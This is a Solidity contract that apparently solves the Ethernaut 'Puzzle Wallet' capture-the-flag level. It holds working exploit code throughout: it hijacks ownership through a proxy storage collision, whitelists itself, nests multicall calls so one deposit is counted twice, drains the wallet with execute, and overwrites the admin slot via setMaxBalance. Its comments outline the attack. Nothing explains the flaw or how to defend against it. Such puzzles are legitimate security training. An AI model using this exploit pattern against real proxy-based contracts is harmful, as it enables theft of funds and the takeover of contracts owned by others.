// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;


interface PuzzleProxy  {
 
 
    function proposeNewAdmin(address _newAdmin) external ;
    function approveNewAdmin(address _expectedAdmin) external ;

    function upgradeTo(address _newImplementation) external;
    
}

interface PuzzleWallet {
 

    function setMaxBalance(uint256 _maxBalance) external ;

    function addToWhitelist(address addr) external ;

    function deposit() external payable ;

    function execute(address to, uint256 value, bytes calldata data) external payable ;

    function multicall(bytes[] calldata data) external payable;
    
}


// propose new admin
//whitelist malicious contract
//deposit twice
//call execute to clear  any balance
//setMaxbalance to uint160 of my address


contract PuzzleMaze{

    function runOne(address _puzzle) public {
        PuzzleProxy(_puzzle).proposeNewAdmin(address(this));
        PuzzleWallet(_puzzle).addToWhitelist(address(this));
    }
     function runAll(address _puzzle) public payable {
        bytes memory data = abi.encodeWithSignature("deposit()");
         bytes[] memory log2 = new bytes[](1);
        log2[0] = data;
        bytes memory data2 = abi.encodeWithSignature("multicall(bytes[])", log2);
        bytes[] memory log = new bytes[](2);
        log[0] = data;
        log[1] = data2;
       
        PuzzleWallet(_puzzle).multicall{value: msg.value}(log);
        PuzzleWallet(_puzzle).execute(msg.sender, 0.002 ether, "");
        PuzzleWallet(_puzzle).setMaxBalance(uint256(uint160(msg.sender)));
    }
}